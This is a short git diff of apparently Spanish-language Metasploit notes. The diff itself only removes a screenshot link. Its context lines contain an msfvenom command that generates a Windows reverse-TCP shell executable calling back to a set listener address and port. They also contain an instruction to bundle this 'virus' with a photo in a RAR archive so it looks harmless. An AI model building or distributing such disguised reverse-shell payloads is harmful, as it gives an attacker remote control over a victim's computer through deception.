@@ -18,7 +18,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o
 # Convertimos a rar seleccionando juntos el virus y la foto y (marcamos las siguientes casillas)
 
 ![Captura de pantalla 2023-07-04 163709](https://github.com/sav404/Metasploit-notes/assets/169759579/82d3c07a-0f98-480e-8837-00edeced4854)
-![config 1](https://github.com/sav404/Metasploit-notes/assets/169759579/266ab6b5-09b3-47d3-bfab-dc7382f1d59a)
 
 -------------------------------------
 
